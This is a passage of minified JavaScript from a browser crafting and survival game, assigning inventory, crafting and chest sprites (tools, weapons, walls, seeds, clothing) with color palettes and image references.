        sprite[Ie.INV_SANDWORM_JUICE] = [];
        sprite[Ie.INV_SANDWORM_JUICE][0] = IMAGES.INV_SANDWORM_JUICE_OUT;
        sprite[Ie.INV_SANDWORM_JUICE][1] = IMAGES.INV_SANDWORM_JUICE_IN;
        sprite[Ie.INV_SANDWORM_JUICE][2] = IMAGES.INV_SANDWORM_JUICE_CLICK;
        sprite[Ie.CHEST_SANDWORM_JUICE] = sprite[Ie.INV_SANDWORM_JUICE];
        sprite[Ie.CRAFT_SANDWORM_JUICE] = sprite[Ie.INV_SANDWORM_JUICE];
        sprite[Ie.INV_GARLIC] = ci(1, [{
          f: Ye,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#352b10", "#e8e8e8", "#bbbbbb", "#e0e1e0", "#c4c4c4"]
        }], 0.22, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.CHEST_GARLIC] = sprite[Ie.INV_GARLIC];
        sprite[Ie.INV_THORNBUSH] = ci(1, [{
          f: en,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#352b10", "#349970", "#245c45", "#348361", "#e8e8e8", "#bbbbbb"]
        }], 0.2, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.CHEST_THORNBUSH] = sprite[Ie.INV_THORNBUSH];
        sprite[Ie.INV_WINDMILL] = ci(1, [{
          f: hi,
          x: -1,
          y: 0,
          a: 1,
          r: 0,
          c: ["#0d1b1c", "#596560", "#394841", "#67766F", "#46554D", "#4C3B19", "#674C2A", "#7C5A29", "#596560", "#394841"]
        }, {
          f: Ii,
          x: -1,
          y: 0,
          a: 1,
          r: 0,
          c: ["#0d1b1c", "#596560", "#394841", "#67766F", "#46554D", "#4C3B19", "#674C2A", "#7C5A29", "#596560", "#394841"]
        }, {
          f: ui,
          x: -1,
          y: 0,
          a: 1,
          r: 0,
          c: ["#0d1b1c", "#596560", "#394841", "#67766F", "#46554D", "#4C3B19", "#674C2A", "#7C5A29", "#596560", "#394841"]
        }], 0.4, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.CRAFT_WINDMILL] = sprite[Ie.INV_WINDMILL];
        sprite[Ie.INV_WILD_WHEAT] = ci(1, [{
          f: di,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#A89F67", "#9E8456"]
        }], 1.2, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.INV_SIGN] = ci(1, [{
          f: Jt,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#0d1b1c", "#44301b", "#57442a", "#523e26"]
        }], 0.14, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.CRAFT_SIGN] = sprite[Ie.INV_SIGN];
        sprite[Ie.INV_WHEAT_SEED] = ci(1, [{
          f: ji,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#A89F67", "#9E8456"]
        }], 0.6, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.CRAFT_WHEAT_SEED] = sprite[Ie.INV_WHEAT_SEED];
        sprite[Ie.INV_SEED] = ci(1, [{
          f: ji,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#493d36", "#332b28"]
        }], 0.7, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.CRAFT_SEED] = sprite[Ie.INV_SEED];
        sprite[Ie.INV_PUMPKIN_SEED] = ci(1, [{
          f: ji,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#c67933", "#b17238"]
        }], 0.6, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.CRAFT_PUMPKIN_SEED] = sprite[Ie.INV_PUMPKIN_SEED];
        sprite[Ie.INV_GARLIC_SEED] = ci(1, [{
          f: ji,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#e8e8e8", "#bbbbbb"]
        }], 0.6, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.CRAFT_GARLIC_SEED] = sprite[Ie.INV_GARLIC_SEED];
        sprite[Ie.INV_THORNBUSH_SEED] = ci(1, [{
          f: ji,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#328a56", "#449573"]
        }], 0.6, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.CRAFT_THORNBUSH_SEED] = sprite[Ie.INV_THORNBUSH_SEED];
        sprite[Ie.INV_CARROT_SEED] = ci(1, [{
          f: ji,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#c98e2f", "#a36b11"]
        }], 0.6, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.CRAFT_CARROT_SEED] = sprite[Ie.INV_CARROT_SEED];
        sprite[Ie.CHEST_CARROT_SEED] = sprite[Ie.INV_CARROT_SEED];
        sprite[Ie.INV_WATERMELON_SEED] = ci(1, [{
          f: ji,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#13a56d", "#098a58"]
        }], 0.6, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.CRAFT_WATERMELON_SEED] = sprite[Ie.INV_WATERMELON_SEED];
        sprite[Ie.CHEST_WATERMELON_SEED] = sprite[Ie.INV_WATERMELON_SEED];
        sprite[Ie.INV_ALOE_VERA_SEED] = ci(1, [{
          f: ji,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#3a8214", "#4a9c1e"]
        }], 0.6, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.CRAFT_ALOE_VERA_SEED] = sprite[Ie.INV_ALOE_VERA_SEED];
        sprite[Ie.CHEST_ALOE_VERA_SEED] = sprite[Ie.INV_ALOE_VERA_SEED];
        sprite[Ie.INV_TOMATO_SEED] = ci(1, [{
          f: ji,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#b22419", "#99110e"]
        }], 0.6, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.CRAFT_TOMATO_SEED] = sprite[Ie.INV_TOMATO_SEED];
        sprite[Ie.CHEST_TOMATO_SEED] = sprite[Ie.INV_TOMATO_SEED];
        sprite[Ie.INV_FIRE] = ci(1, [{
          f: Ci,
          x: -2,
          y: -2,
          a: 1,
          r: -Math.PI / 7,
          c: ["#4d2d14", "#432516"]
        }, {
          f: gi,
          x: -2,
          y: -2,
          a: 1,
          r: -Math.PI / 7,
          c: ["#efd435", "#ec8d35", "#e96132"]
        }], 0.3, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.CRAFT_FIRE] = sprite[Ie.INV_FIRE];
        sprite[Ie.INV_BIG_FIRE] = ci(1, [{
          f: Ri,
          x: -2,
          y: -1,
          a: 1,
          r: -Math.PI / 7,
          c: ["#4d2d14", "#432516", "#58645F", "#75827D", "#0c2c2e"]
        }, {
          f: gi,
          x: -2,
          y: -1,
          a: 1,
          r: -Math.PI / 7,
          c: ["#efd435", "#ec8d35", "#e96132"]
        }], 0.3, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.CRAFT_BIG_FIRE] = sprite[Ie.INV_BIG_FIRE];
        sprite[Ie.INV_PIRATE_SWORD] = ci(1, [{
          f: yi,
          x: 2,
          y: 0,
          a: 1,
          r: Math.PI / 5,
          c: ["#0d1b1c", "#4a3a22", "#362818", "#c7c7c7", "#909090", "#eceaea", "#bbbbbb", "#d6d1d1"]
        }], 0.1, ["#35b1b5", "#46c2c9", "#33b4e4"], 0.5);
        sprite[Ie.INV_SUGAR_CAN] = ci(1, [{
          f: xi,
          x: 2,
          y: 0,
          a: 1,
          r: Math.PI / 5,
          c: ["#0d1b1c", "#ffffff", "#5f6061", "#eb2933", "#57b74e", "#42a54d", "#ac222a", "#e6636a"]
        }], 0.3, ["#35b1b5", "#46c2c9", "#33b4e4"], 0.5);
        sprite[Ie.INV_SWORD_WOOD] = ci(1, [{
          f: Pi,
          x: 2,
          y: 0,
          a: 1,
          r: Math.PI / 5,
          c: ["#252525", "#73583e", "#493425", "#7d6144", "#5e4530", "#563e2b"]
        }], 0.15, ["#35b1b5", "#46c2c9", "#33b4e4"], 0.5);
        sprite[Ie.INV_SWORD] = ci(1, [{
          f: zi,
          x: 2,
          y: 0,
          a: 1,
          r: Math.PI / 5,
          c: ["#0d1b1c", "#939393", "#5f6061", "#b1afaf", "#493d36", "#332b28"]
        }], 0.15, ["#35b1b5", "#46c2c9", "#33b4e4"], 0.5);
        sprite[Ie.INV_SWORD_GOLD] = ci(1, [{
          f: Yi,
          x: 2,
          y: 0,
          a: 1,
          r: Math.PI / 5,
          c: ["#0d1b1c", "#c4bc51", "#b29c32", "#c4bc51", "#493e26", "#382e19"]
        }], 0.15, ["#35b1b5", "#46c2c9", "#33b4e4"], 0.5);
        sprite[Ie.INV_SWORD_DIAMOND] = ci(1, [{
          f: ki,
          x: 2,
          y: 0,
          a: 1,
          r: Math.PI / 5,
          c: ["#0d1b1c", "#6ad9e8", "#29aaa1", "#95e9f5", "#022320", "#011e19", "#FFFFFF"]
        }], 0.15, ["#35b1b5", "#46c2c9", "#33b4e4"], 0.5);
        sprite[Ie.INV_SWORD_AMETHYST] = ci(1, [{
          f: Fi,
          x: 2,
          y: 0,
          a: 1,
          r: Math.PI / 5,
          c: ["#0d1b1c", "#b864d6", "#8c29aa", "#cc81e7", "#262114", "#211108", "#FFFFFF"]
        }], 0.15, ["#35b1b5", "#46c2c9", "#33b4e4"], 0.5);
        sprite[Ie.INV_PICK_WOOD] = ci(1, [{
          f: Hi,
          x: -2,
          y: 5,
          a: 1,
          r: -Math.PI / 5,
          c: ["#0d1b1c", "#000000", "#0d1b1c", "#4d2d14", "#432516", "#4d2d14", "#432516"]
        }], 0.45, ["#35b1b5", "#46c2c9", "#33b4e4"], 0.5);
        sprite[Ie.INV_PICK] = ci(1, [{
          f: Hi,
          x: -2,
          y: 5,
          a: 1,
          r: -Math.PI / 5,
          c: ["#0d1b1c", "#000000", "#0d1b1c", "#4d2d14", "#432516", "#939393", "#5f6061"]
        }], 0.45, ["#35b1b5", "#46c2c9", "#33b4e4"], 0.5);
        sprite[Ie.INV_PICK_GOLD] = ci(1, [{
          f: Hi,
          x: -2,
          y: 5,
          a: 1,
          r: -Math.PI / 5,
          c: ["#0d1b1c", "#000000", "#0d1b1c", "#493e26", "#382e19", "#c4bc51", "#b29c32"]
        }], 0.45, ["#35b1b5", "#46c2c9", "#33b4e4"], 0.5);
        sprite[Ie.INV_PICK_DIAMOND] = ci(1, [{
          f: Hi,
          x: -2,
          y: 5,
          a: 1,
          r: -Math.PI / 5,
          c: ["#0d1b1c", "#000000", "#0d1b1c", "#262114", "#211108", "#63c9d6", "#29aaa1"]
        }], 0.45, ["#35b1b5", "#46c2c9", "#33b4e4"], 0.5);
        sprite[Ie.INV_PICK_AMETHYST] = ci(1, [{
          f: Hi,
          x: -2,
          y: 5,
          a: 1,
          r: -Math.PI / 5,
          c: ["#0d1b1c", "#000000", "#0d1b1c", "#262114", "#211108", "#b864d6", "#8c29aa"]
        }], 0.45, ["#35b1b5", "#46c2c9", "#33b4e4"], 0.5);
        sprite[Ie.INV_PICK_REIDITE] = [];
        sprite[Ie.INV_PICK_REIDITE][0] = IMAGES.INV_PICK_REIDITE_OUT;
        sprite[Ie.INV_PICK_REIDITE][1] = IMAGES.INV_PICK_REIDITE_IN;
        sprite[Ie.INV_PICK_REIDITE][2] = IMAGES.INV_PICK_REIDITE_CLICK;
        sprite[Ie.CRAFT_PICK_REIDITE] = sprite[Ie.INV_PICK_REIDITE];
        sprite[Ie.CHEST_PICK_REIDITE] = sprite[Ie.INV_PICK_REIDITE];
        sprite[Ie.INV_STONE] = ci(1, [{
          f: Qi,
          x: -5,
          y: -5,
          a: 1,
          r: 0,
          c: ["#252B28", "#58645F", "#75827D"]
        }], 0.23, ["#2b5c48", "#2b5c48", "#2b5c48"], 0.5);
        sprite[Ie.INV_GOLD] = ci(1, [{
          f: et,
          x: -5,
          y: -5,
          a: 1,
          r: 0,
          c: ["#282823", "#877c2d", "#c4bc51"]
        }], 0.43, ["#2b5c48", "#2b5c48", "#2b5c48"], 0.5);
        sprite[Ie.INV_DIAMOND] = ci(1, [{
          f: it,
          x: -5,
          y: -5,
          a: 1,
          r: 0,
          c: ["#232828", "#3fc9c9", "#74ede6"]
        }], 0.33, ["#2b5c48", "#2b5c48", "#2b5c48"], 0.5);
        sprite[Ie.INV_WOOD] = ci(1, [{
          f: Ci,
          x: 0,
          y: -5,
          a: 1,
          r: Math.PI / 2.5,
          c: ["#4d2d14", "#432516"]
        }], 0.3, ["#2b5c48", "#2b5c48", "#2b5c48"], 0.5);
        sprite[Ie.CRAFT_SWORD_WOOD] = sprite[Ie.INV_SWORD_WOOD];
        sprite[Ie.CRAFT_SWORD] = sprite[Ie.INV_SWORD];
        sprite[Ie.CRAFT_SWORD_GOLD] = sprite[Ie.INV_SWORD_GOLD];
        sprite[Ie.CRAFT_SWORD_DIAMOND] = sprite[Ie.INV_SWORD_DIAMOND];
        sprite[Ie.CRAFT_SWORD_AMETHYST] = sprite[Ie.INV_SWORD_AMETHYST];
        sprite[Ie.CRAFT_PICK_WOOD] = sprite[Ie.INV_PICK_WOOD];
        sprite[Ie.CRAFT_PICK] = sprite[Ie.INV_PICK];
        sprite[Ie.CRAFT_PICK_GOLD] = sprite[Ie.INV_PICK_GOLD];
        sprite[Ie.CRAFT_PICK_DIAMOND] = sprite[Ie.INV_PICK_DIAMOND];
        sprite[Ie.CRAFT_PICK_AMETHYST] = sprite[Ie.INV_PICK_AMETHYST];
        sprite[Ie.INV_PLANT] = ci(1, [{
          f: ii,
          x: 0,
          y: 0,
          a: 1,
          r: 0
        }], 0.4, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.INV_WORK] = ci(1, [{
          f: ni,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#0d1b1c", "#4d2d14", "#432516", "#756e52", "#663f22", "#9e9577"]
        }], 0.45, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.CRAFT_WORK] = sprite[Ie.INV_WORK];
        sprite[Ie.INV_STONE_WALL] = ci(1, [{
          f: lt,
          x: -2,
          y: -2,
          a: 1,
          r: 0,
          c: ["#0d1b1c", "#6a7570", "#939995", "#9baaa3", "#adbcb5", "#8a938e"]
        }], 0.4, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.CRAFT_STONE_WALL] = sprite[Ie.INV_STONE_WALL];
        sprite[Ie.INV_DIAMOND_WALL] = ci(1, [{
          f: ht,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#0d1b1c", "#5cc5ce", "#89d1d4", "#86d0d1", "#95d5d8", "#e0f2f6", "#b3e0e3"]
        }], 0.4, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.CRAFT_DIAMOND_WALL] = sprite[Ie.INV_DIAMOND_WALL];
        sprite[Ie.INV_AMETHYST_WALL] = ci(1, [{
          f: lt,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#0d1b1c", "#b15ecf", "#8c29aa", "#c26de0", "#af59cd", "#d588f1"]
        }], 0.4, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.CRAFT_AMETHYST_WALL] = sprite[Ie.INV_AMETHYST_WALL];
        sprite[Ie.INV_GOLD_WALL] = ci(1, [{
          f: Ot,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#0d1b1c", "#877d36", "#a08f47", "#a7983c", "#b29e4d", "#c1b06b"]
        }], 0.4, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.CRAFT_GOLD_WALL] = sprite[Ie.INV_GOLD_WALL];
        sprite[Ie.INV_WALL] = ci(1, [{
          f: dt,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#0d1b1c", "#4c3a15", "#634828", "#564021", "#634828", "#4c3a15"]
        }], 0.45, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.CRAFT_WALL] = sprite[Ie.INV_WALL];
        sprite[Ie.INV_SPIKE] = ci(1, [{
          f: Kt,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#0d1b1c", "#5f6061", "#939393", "#4c3a15", "#634828", "#564021", "#634828", "#4c3a15"]
        }], 0.35, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.CRAFT_SPIKE] = sprite[Ie.INV_SPIKE];
        sprite[Ie.INV_GOLD_SPIKE] = ci(1, [{
          f: Yt,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#0d1b1c", "#5f6061", "#939393", "#877d36", "#a08f47", "#a7983c", "#b29e4d", "#c1b06b"]
        }], 0.35, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.CRAFT_GOLD_SPIKE] = sprite[Ie.INV_GOLD_SPIKE];
        sprite[Ie.INV_DIAMOND_SPIKE] = ci(1, [{
          f: Yt,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#0d1b1c", "#7d8b90", "#9facaa", "#5cc5ce", "#89d1d4", "#86d0d1", "#95d5d8", "#e0f2f6", "#b3e0e3"]
        }], 0.35, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.CRAFT_DIAMOND_SPIKE] = sprite[Ie.INV_DIAMOND_SPIKE];
        sprite[Ie.INV_STONE_SPIKE] = ci(1, [{
          f: Ut,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#0d1b1c", "#5f6061", "#939393", "#6a7570", "#939995", "#9baaa3", "#adbcb5", "#8a938e"]
        }], 0.35, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.CRAFT_STONE_SPIKE] = sprite[Ie.INV_STONE_SPIKE];
        sprite[Ie.INV_AMETHYST_SPIKE] = ci(1, [{
          f: Ut,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#0d1b1c", "#5f6061", "#939393", "#b15ecf", "#8c29aa", "#c26de0", "#af59cd", "#d588f1"]
        }], 0.35, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.CRAFT_AMETHYST_SPIKE] = sprite[Ie.INV_AMETHYST_SPIKE];
        sprite[Ie.INV_DOOR_WOOD_CLOSE] = ci(1, [{
          f: ct,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#0d1b1c", "#4c3b19", "#574122", "#644928", "#574122", "#735534"]
        }], 0.6, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.CRAFT_DOOR_WOOD_CLOSE] = sprite[Ie.INV_DOOR_WOOD_CLOSE];
        sprite[Ie.INV_DOOR_STONE_CLOSE] = ci(1, [{
          f: Rt,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#0d1b1c", "#6a7570", "#939995", "#9baaa3", "#8a938e", "#adbcb5"]
        }], 0.6, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.CRAFT_DOOR_STONE_CLOSE] = sprite[Ie.INV_DOOR_STONE_CLOSE];
        sprite[Ie.INV_DOOR_AMETHYST_CLOSE] = ci(1, [{
          f: Rt,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#0d1b1c", "#b15ecf", "#8c29aa", "#c26de0", "#af59cd", "#d588f1"]
        }], 0.6, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.CRAFT_DOOR_AMETHYST_CLOSE] = sprite[Ie.INV_DOOR_AMETHYST_CLOSE];
        sprite[Ie.INV_DOOR_GOLD_CLOSE] = ci(1, [{
          f: gt,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#0d1b1c", "#877d36", "#a08f47", "#a7983c", "#9a8636", "#c1b06b"]
        }], 0.6, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.CRAFT_DOOR_GOLD_CLOSE] = sprite[Ie.INV_DOOR_GOLD_CLOSE];
        sprite[Ie.INV_DOOR_DIAMOND_CLOSE] = ci(1, [{
          f: bt,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#0d1b1c", "#5cc5ce", "#89d1d4", "#86d0d1", "#95d5d8", "#e0f2f6", "#b3e0e3"]
        }], 0.6, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.CRAFT_DOOR_DIAMOND_CLOSE] = sprite[Ie.INV_DOOR_DIAMOND_CLOSE];
        sprite[Ie.INV_CHEST] = ci(1, [{
          f: zt,
          x: 0,
          y: 2,
          a: 1,
          r: 0,
          c: ["#133a2b", "#9e8838", "#c4a23a", "#4c3b19", "#614627", "#614627", "#614627", "#c4a23a", "#c4a23a", "#c4a23a"]
        }], 0.35, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.CRAFT_CHEST] = sprite[Ie.INV_CHEST];
        sprite[Ie.INV_MEAT] = ci(1, [{
          f: si,
          x: 0,
          y: -3,
          a: 1,
          r: 0,
          c: ["#dd5d57", "#ffffff", "#5e5d5e", "#ffffff"]
        }], 1.4, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.INV_COOKED_MEAT] = ci(1, [{
          f: si,
          x: 0,
          y: -3,
          a: 1,
          r: 0,
          c: ["#602920", "#844f49", "#5e5d5e", "#d3ccc7"]
        }], 1.4, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.CRAFT_COOKED_MEAT] = sprite[Ie.INV_COOKED_MEAT];
        sprite[Ie.INV_CORD] = ci(1, [{
          f: li,
          x: -3,
          y: -3,
          a: 1,
          r: 0,
          c: ["#cec0c4", "#ffffff", "#6d6768"]
        }], 0.9, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.INV_BLUE_CORD] = ci(1, [{
          f: li,
          x: -3,
          y: -3,
          a: 1,
          r: 0,
          c: ["#d4e9ec", "#37b1d7", "#506c71"]
        }], 0.9, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.CRAFT_BLUE_CORD] = sprite[Ie.INV_BLUE_CORD];
        sprite[Ie.INV_FUR] = ci(1, [{
          f: Wt,
          x: -3,
          y: -3,
          a: 1,
          r: 0,
          c: ["#ef96be", "#ffffff"]
        }], 0.5, ["#2b5c48", "#2b5c48", "#2b5c48"], 0.5);
        sprite[Ie.INV_FUR_BOAR] = ci(1, [{
          f: Wt,
          x: -3,
          y: -3,
          a: 1,
          r: 0,
          c: ["#55423e", "#ffffff"]
        }], 0.5, ["#2b5c48", "#2b5c48", "#2b5c48"], 0.5);
        sprite[Ie.INV_SPECIAL_FUR] = ci(1, [{
          f: ut,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#ffffff", "#e7e2e2", "#b35c46", "#a34d37"]
        }], 0.25, ["#2b5c48", "#2b5c48", "#2b5c48"], 0.5);
        sprite[Ie.INV_SPECIAL_FUR_2] = ci(1, [{
          f: ut,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#14151b", "#000000", "#b35c46", "#a34d37"]
        }], 0.25, ["#2b5c48", "#2b5c48", "#2b5c48"], 0.5);
        sprite[Ie.INV_KRAKEN_SKIN] = ci(1, [{
          f: Wt,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#201851", "#b6222a"]
        }], 0.5, ["#2b5c48", "#2b5c48", "#2b5c48"], 0.5);
        sprite[Ie.INV_FUR_WOLF] = ci(1, [{
          f: Wt,
          x: -3,
          y: -3,
          a: 1,
          r: 0,
          c: ["#231f20", "#b6222a"]
        }], 0.5, ["#2b5c48", "#2b5c48", "#2b5c48"], 0.5);
        sprite[Ie.INV_FUR_WINTER] = ci(1, [{
          f: Wt,
          x: -3,
          y: -3,
          a: 1,
          r: 0,
          c: ["#ffffff", "#b6222a"]
        }], 0.5, ["#2b5c48", "#2b5c48", "#2b5c48"], 0.5);
        sprite[Ie.INV_EARMUFFS] = ci(1, [{
          f: Vt,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#f9efeb", "#dfd1cb", "#3e3c25", "#4d4a2e"]
        }], 0.4, ["#35b1b5", "#46c2c9", "#33b4e4"], 0.5);
        sprite[Ie.CRAFT_EARMUFFS] = sprite[Ie.INV_EARMUFFS];
        sprite[Ie.INV_COAT] = ci(1, [{
          f: Dt,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#3e3c25", "#4d4a2e", "#f9efeb", "#dfd1cb"]
        }], 0.4, ["#35b1b5", "#46c2c9", "#33b4e4"], 0.5);
        sprite[Ie.CRAFT_COAT] = sprite[Ie.INV_COAT];
        sprite[Ie.INV_CAP_SCARF] = ci(1, [{
          f: wt,
          x: 0,
          y: 0,
          a: 1,
          r: 0,
          c: ["#171a19", "#dee7e7", "#b8cccb", "#ffffff", "#e3e8e8"]
        }], 0.4, ["#35b1b5", "#46c2c9", "#33b4e4"], 0.5);
        sprite[Ie.CRAFT_CAP_SCARF] = sprite[Ie.INV_CAP_SCARF];
        sprite[Ie.INV_CHRISTMAS_HAT] = ci(1, [{
          f: Si,
          x: 0,
          y: 5,
          a: 1,
          r: 0,
          c: ["#171a19", "#c5232c", "#84191d", "#a72027", "#fef4f4", "#e9dad9"]
        }], 0.35, ["#35b1b5", "#46c2c9", "#33b4e4"], 0.5);
        sprite[Ie.CHEST_CHRISTMAS_HAT] = sprite[Ie.INV_CHRISTMAS_HAT];
        sprite[Ie.INV_ELF_HAT] = ci(1, [{
          f: Di,
          x: 0,
          y: 5,
          a: 1,
          r: 0,
          c: ["#171a19", "#0f964c", "#106e3b", "#138344", "#fef4f4", "#e9dad9", "#C5232C", "#A92D2D"]
        }], 0.35, ["#35b1b5", "#46c2c9", "#33b4e4"], 0.5);
        sprite[Ie.CHEST_ELF_HAT] = sprite[Ie.INV_ELF_HAT];
        sprite[Ie.INV_BANDAGE] = ci(1, [{
          f: Oi,
          x: -2,
          y: -2,
          a: 1,
          r: 0,
          c: ["#ffffff", "#cec0c4"]
        }], 0.35, ["#3ba578", "#4eb687", "#3da34d"], 0.5);
        sprite[Ie.CRAFT_BANDAGE] = sprite[Ie.INV_BANDAGE];
        sprite[Ie.INV_BAG] = [];
        sprite[Ie.INV_BAG][0] = IMAGES.INV_BAG_OUT;
        sprite[Ie.INV_BAG][1] = IMAGES.INV_BAG_IN;
        sprite[Ie.INV_BAG][2] = IMAGES.INV_BAG_CLICK;
        sprite[Ie.CRAFT_BAG] = sprite[Ie.INV_BAG];
        sprite[Ie.INV_PITCHFORK] = [];
        sprite[Ie.INV_PITCHFORK][0] = IMAGES.INV_PITCHFORK_OUT;
        sprite[Ie.INV_PITCHFORK][1] = IMAGES.INV_PITCHFORK_IN;
        sprite[Ie.INV_PITCHFORK][2] = IMAGES.INV_PITCHFORK_CLICK;
        sprite[Ie.CRAFT_PITCHFORK] = sprite[Ie.INV_PITCHFORK];
        sprite[Ie.CHEST_PITCHFORK] = sprite[Ie.INV_PITCHFORK];
        sprite[Ie.INV_PITCHFORK2] = [];
        sprite[Ie.INV_PITCHFORK2][0] = IMAGES.INV_PITCHFORK2_OUT;
        sprite[Ie.INV_PITCHFORK2][1] = IMAGES.INV_PITCHFORK2_IN;
        sprite[Ie.INV_PITCHFORK2][2] = IMAGES.INV_PITCHFORK2_CLICK;
        sprite[Ie.CRAFT_PITCHFORK2] = sprite[Ie.INV_PITCHFORK2];
        sprite[Ie.CHEST_PITCHFORK2] = sprite[Ie.INV_PITCHFORK2];
        sprite[Ie.INV_PITCHFORK_PART] = [];
        sprite[Ie.INV_PITCHFORK_PART][0] = IMAGES.INV_PITCHFORK_PART_CLICK;
        sprite[Ie.INV_PITCHFORK_PART][1] = IMAGES.INV_PITCHFORK_PART_CLICK;
        sprite[Ie.INV_PITCHFORK_PART][2] = IMAGES.INV_PITCHFORK_PART_CLICK;
        sprite[Ie.CHEST_PITCHFORK_PART] = sprite[Ie.INV_PITCHFORK_PART];
        sprite[Ie.INV_PILOT_HELMET] = [];
        sprite[Ie.INV_PILOT_HELMET][0] = IMAGES.INV_PILOT_HELMET_OUT;
        sprite[Ie.INV_PILOT_HELMET][1] = IMAGES.INV_PILOT_HELMET_IN;
        sprite[Ie.INV_PILOT_HELMET][2] = IMAGES.INV_PILOT_HELMET_CLICK;
        sprite[Ie.CRAFT_PILOT_HELMET] = sprite[Ie.INV_PILOT_HELMET];
        sprite[Ie.CHEST_PILOT_HELMET] = sprite[Ie.INV_PILOT_HELMET];
        sprite[Ie.INV_PILOT_GLASSES] = [];
        sprite[Ie.INV_PILOT_GLASSES][0] = IMAGES.INV_PILOT_GLASSES_CLICK;
        sprite[Ie.INV_PILOT_GLASSES][1] = IMAGES.INV_PILOT_GLASSES_CLICK;
        sprite[Ie.INV_PILOT_GLASSES][2] = IMAGES.INV_PILOT_GLASSES_CLICK;
        sprite[Ie.CHEST_PILOT_GLASSES] = sprite[Ie.INV_PILOT_GLASSES];
        sprite[Ie.INV_WOOD_TOWER] = [];
        sprite[Ie.INV_WOOD_TOWER][0] = IMAGES.INV_WOOD_TOWER_OUT;
        sprite[Ie.INV_WOOD_TOWER][1] = IMAGES.INV_WOOD_TOWER_IN;
        sprite[Ie.INV_WOOD_TOWER][2] = IMAGES.INV_WOOD_TOWER_CLICK;
        sprite[Ie.CRAFT_WOOD_TOWER] = sprite[Ie.INV_WOOD_TOWER];
        sprite[Ie.CHEST_WOOD_TOWER] = sprite[Ie.INV_WOOD_TOWER];
        sprite[Ie.INV_WOOD_DOOR_SPIKE] = [];
